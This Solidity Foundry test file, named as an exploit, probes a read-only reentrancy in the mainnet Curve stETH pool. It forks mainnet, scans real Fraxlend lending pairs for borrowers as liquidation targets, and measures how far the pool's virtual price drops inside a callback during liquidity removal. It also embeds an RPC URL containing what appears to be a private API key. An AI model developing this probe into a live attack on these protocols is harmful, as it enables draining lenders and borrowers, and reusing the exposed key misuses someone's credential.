// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ICurvePool {
    function get_virtual_price() external view returns (uint256);
    function remove_liquidity(uint256, uint256[2] calldata) external returns (uint256[2] memory);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IFraxlendPair {
    function userCollateralBalance(address) external view returns (uint256);
    function userBorrowShares(address) external view returns (uint256);
    function totalBorrow() external view returns (uint128 amount, uint128 shares);
    function exchangeRateInfo() external view returns (uint32 lastTimestamp, uint64 exchangeRate, uint64 ratePerSec);
    function maxLTV() external view returns (uint256);
    function liquidate(uint128 shares, uint256 minAssets, address borrower, address receiver) external returns (uint256);
}

contract CurveReentrancyExploit is Test {
    ICurvePool constant CURVE_STETH_POOL = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant CURVE_STETH_LP = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);

    // Known Fraxlend pairs that might use Curve LP as collateral
    address[] fraxlendPairs;

    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1000 ether);

        // Add known Fraxlend pairs
        fraxlendPairs.push(0x78bB3aEC3d855431bd9289fD98dA13F9ebB7ef15); // FraxlendPair stETH
        fraxlendPairs.push(0x3a25B9aB8c07FfEFEe614531C75905E810d8A239); // FraxlendPair sfrxETH
    }

    function test_findLiquidatablePositions() public view {
        console.log("=== Searching for liquidatable positions ===");
        console.log("Curve stETH virtual_price:", CURVE_STETH_POOL.get_virtual_price());

        for (uint i = 0; i < fraxlendPairs.length; i++) {
            address pair = fraxlendPairs[i];

            // Check if this pair exists and has borrowers
            (bool success, bytes memory data) = pair.staticcall(
                abi.encodeWithSignature("totalBorrow()")
            );

            if (success && data.length >= 32) {
                (uint128 totalAmount,) = abi.decode(data, (uint128, uint128));
                if (totalAmount > 0) {
                    console.log("Pair:", pair);
                    console.log("Total borrowed:", totalAmount / 1e18);
                }
            }
        }
    }

    function test_measureReentrancyWindow() public {
        console.log("=== Measuring reentrancy window ===");

        // Deal LP tokens directly using Foundry cheatcode
        uint256 testAmount = 1000 ether;
        deal(address(CURVE_STETH_LP), address(this), testAmount);
        console.log("Dealt LP tokens:", testAmount / 1e18);

        uint256 vpBefore = CURVE_STETH_POOL.get_virtual_price();
        console.log("VP before:", vpBefore);

        // Deploy probe
        ReentrancyMeasurer probe = new ReentrancyMeasurer(address(CURVE_STETH_POOL), address(CURVE_STETH_LP));

        // Transfer LP to probe
        CURVE_STETH_LP.transfer(address(probe), testAmount);

        // Execute removal and measure VP during callback
        try probe.measure(testAmount) {
            console.log("VP during callback:", probe.vpDuring());
            console.log("VP after:", CURVE_STETH_POOL.get_virtual_price());

            if (probe.vpDuring() > 0 && probe.vpDuring() < vpBefore) {
                uint256 dropBps = (vpBefore - probe.vpDuring()) * 10000 / vpBefore;
                console.log("!!! VP DROP CONFIRMED:", dropBps, "bps !!!");
            }
        } catch Error(string memory reason) {
            console.log("Removal failed:", reason);
        } catch {
            console.log("Removal failed (no reason)");
        }
    }
}

contract ReentrancyMeasurer {
    ICurvePool public pool;
    IERC20 public lpToken;
    uint256 public vpDuring;
    bool private inCallback;

    constructor(address _pool, address _lpToken) {
        pool = ICurvePool(_pool);
        lpToken = IERC20(_lpToken);
    }

    function measure(uint256 amount) external {
        // Approve pool to spend LP tokens
        lpToken.approve(address(pool), amount);
        uint256[2] memory mins = [uint256(0), uint256(0)];
        pool.remove_liquidity(amount, mins);
    }

    receive() external payable {
        if (!inCallback) {
            inCallback = true;
            vpDuring = pool.get_virtual_price();
            inCallback = false;
        }
    }
}
